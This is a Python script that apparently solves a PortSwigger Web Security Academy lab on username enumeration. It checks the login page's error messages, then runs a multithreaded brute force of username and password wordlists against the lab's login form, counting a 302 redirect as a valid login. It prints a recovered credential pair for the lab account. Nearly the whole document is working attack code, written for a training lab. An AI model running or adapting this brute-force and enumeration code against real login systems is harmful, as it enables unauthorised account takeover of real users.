# Lab: Username enumeration via subtly different responses

import requests
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

base = "https://0ad100fb04782fbf829b701d00c900b5.web-security-academy.net"
guess_session = requests.Session()

print("===========[step1] Recon login fail message===============")
page_recon_login=guess_session.post(f"{base}/login", data={"username": "test", "password": "1234"})
page_recon_result=page_recon_login.text
print(page_recon_result)
'''
[!] Important finding: Invalid username
=> told us what is wrong exactly
                        <p class=is-warning>Invalid username</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
'''

print("===========[step2] prep files for login bruteforce===============")
# prep username/password list (provided by portswigger's academy)
cwd = Path(__file__).resolve().parent
userid_file = cwd / "username.txt" 
pass_file = cwd / "password.txt"

with open(userid_file, "r", encoding="utf-8") as usernamefile:
    username_content=usernamefile.read()

username_list=username_content.splitlines()

with open(pass_file, "r", encoding="utf-8") as passfile:
    pass_content=passfile.read()

pass_list=pass_content.splitlines()

# list for account which can successfully login
print()
print("[*] Ready to Brute Force")
print()
valid_account = []

def try_login(username, password):
    r = requests.post(f"{base}/login",
                      data={"username": username, "password": password},
                      allow_redirects=False)
    return password, r.status_code

print("===========[step3] Find Valid Account===============")
for username in username_list:
    with ThreadPoolExecutor(max_workers=10) as pool:
        results = pool.map(lambda p: try_login(username, p), pass_list)
        for password, status in results:
            if status == 302:
                print(f"Found: {username} / {password}")
                valid_account.append({username: password})
                break
'''
[!] if username or password mismatch it will return below:
                        <p class=is-warning>Invalid username or password.</p>
'''
print()
print("[*] Listing Found Credentials")
for i, account in enumerate(valid_account, start=1):
    print(f"[{i}] {account}")
print()

'''
[+] Found Account
adserver / 111111
'''
